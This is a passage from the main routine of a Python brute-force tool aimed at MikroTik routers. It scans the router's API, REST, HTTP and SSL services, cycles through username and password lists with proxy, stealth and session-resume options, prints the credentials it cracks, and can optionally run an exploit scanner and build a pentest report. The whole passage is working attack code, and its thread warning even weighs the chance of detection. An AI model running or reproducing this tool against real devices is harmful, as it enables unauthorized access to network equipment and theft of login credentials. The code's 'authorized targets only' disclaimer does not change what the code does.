                stealth_mode=args.stealth,
                fingerprint=args.fingerprint,
            )
            try:
                _res = _eng.run()
                _all_mt_results.extend(_res)
            except KeyboardInterrupt:
                print(f"\n  [multi-target] Interrupted at {_tgt}")
                break
            except Exception as _exc:
                print(f"  [multi-target] Error on {_tgt}: {_exc}")

        if _all_mt_results:
            print(f"\n  [multi-target] *** {len(_all_mt_results)} credential(s) found ***")
            for _r in _all_mt_results:
                print(f"    {_r.get('target','')}  {_r.get('username','')} / {_r.get('password','')}")
        else:
            print(f"\n  [multi-target] No credentials found.\n")
        sys.exit(0)

    # ── Target required for all other modes ───────────────────────────
    if not args.target:
        parser.error("Target (-t) is required. Use --interactive for REPL mode.")

    log = Log(verbose=args.verbose, verbose_all=args.verbose_all)

    # ── Thread count validation & high-thread disclaimer ──────────────
    _req_threads = args.threads
    _high_threads_ack = getattr(args, "high_threads", False)
    _MAX_SAFE    = 15
    _MAX_ALLOWED = 300

    _req_threads = max(1, min(_req_threads, _MAX_ALLOWED))

    if _req_threads > _MAX_SAFE and not _high_threads_ack:
        print(
            f"\n"
            f"  ╔══════════════════════════════════════════════════════════════╗\n"
            f"  ║  ⚠  HIGH THREAD COUNT WARNING — {_req_threads} threads requested          ║\n"
            f"  ╠══════════════════════════════════════════════════════════════╣\n"
            f"  ║  Threads > {_MAX_SAFE} may cause:                                      ║\n"
            f"  ║  • Excessive RAM and CPU consumption on this machine        ║\n"
            f"  ║  • API service overload or crash on the target device       ║\n"
            f"  ║  • Network saturation and noisy logs (IDS/IPS alerts)       ║\n"
            f"  ║  • Increased detection probability                          ║\n"
            f"  ║                                                              ║\n"
            f"  ║  USE AT YOUR OWN RISK on explicitly authorized targets.     ║\n"
            f"  ║  The author is NOT liable for any damage or misuse.         ║\n"
            f"  ╠══════════════════════════════════════════════════════════════╣\n"
            f"  ║  To proceed, re-run with: --high-threads                    ║\n"
            f"  ╚══════════════════════════════════════════════════════════════╝\n"
        )
        sys.exit(1)

    if _req_threads > _MAX_SAFE:
        log.warning(
            f"[!] HIGH THREAD MODE: {_req_threads} threads. "
            f"RAM/CPU impact is your responsibility. Authorized targets only."
        )

    args.threads = _req_threads

    # ── Service discovery ─────────────────────────────────────────────
    services_ok = _scan_services(
        args.target, args.api_port, args.http_port, args.ssl_port, args.ssl
    )

    if not any(services_ok.values()):
        log.warning("[!] No open Mikrotik ports detected. Attack may fail.")

    # ── Export formats ────────────────────────────────────────────────
    if args.export_all:
        export_fmts = ["json", "csv", "xml", "txt"]
    elif args.export:
        export_fmts = [f.strip().lower() for f in args.export.split(",")]
    else:
        export_fmts = []

    # ── Credentials setup ─────────────────────────────────────────────
    usernames = args.userlist if args.userlist else args.user
    passwords = args.passlist if args.passlist else args.passw

    # ── Engine ────────────────────────────────────────────────────────
    engine = BruteforceEngine(
        target=args.target,
        usernames=usernames,
        passwords=passwords,
        combo_dict=args.dictionary,
        delay=_effective_delay if _effective_delay is not None else 0.0,
        api_port=args.api_port,
        rest_port=args.rest_port,
        http_port=args.http_port,
        ssl_port=args.ssl_port,
        use_ssl=args.ssl,
        max_workers=args.threads,
        verbose=args.verbose,
        verbose_all=args.verbose_all,
        validate_services=_parse_validate(args.validate),
        services_ok=services_ok,
        show_progress=args.progress,
        proxy_url=args.proxy,
        export_formats=export_fmts,
        export_dir=args.export_dir,
        max_retries=args.max_retries,
        stealth_mode=args.stealth,
        fingerprint=args.fingerprint,
        session_manager=sm,
        resume_session=args.resume,
        force_new_session=args.force,
    )

    try:
        results = engine.run()
    except KeyboardInterrupt:
        print(f"\n  [{_now()}] Attack interrupted. "
              f"Tested {engine._index}/{len(engine.wordlist)} combinations.\n")
        sys.exit(0)
    except Exception as exc:
        print(f"\n  [ERROR] {exc}")
        if args.verbose_all:
            import traceback
            traceback.print_exc()
        sys.exit(1)

    # ── Exploit scanner ───────────────────────────────────────────────
    if args.exploit:
        try:
            from xpl.scanner import ExploitScanner
            scanner = ExploitScanner()
            xpl_results = scanner.scan_target(args.target)
            scanner.print_results(xpl_results)

            # Optionally generate a full report if we have creds
            if results and export_fmts:
                try:
                    from modules.reports import PentestReportGenerator
                    fp_info = xpl_results.get("fingerprint", {})
                    rg = PentestReportGenerator(
                        target=args.target,
                        fingerprint=fp_info,
                        credentials=results,
                        exploit_results=xpl_results.get("poc_results", []),
                        output_dir=args.export_dir,
                    )
                    report_paths = rg.generate_all()
                    for fmt, path in report_paths.items():
                        log.info(f"[REPORT] {fmt.upper()} → {path}")
                except Exception as rep_exc:
                    log.warning(f"[REPORT] Generation failed: {rep_exc}")
        except ImportError:
            log.warning("[EXPLOIT] xpl module not found — skipping.")
        except Exception as exc:
            log.warning(f"[EXPLOIT] Scan failed: {exc}")
            if args.verbose_all:
                import traceback
                traceback.print_exc()


if __name__ == "__main__":
    main()

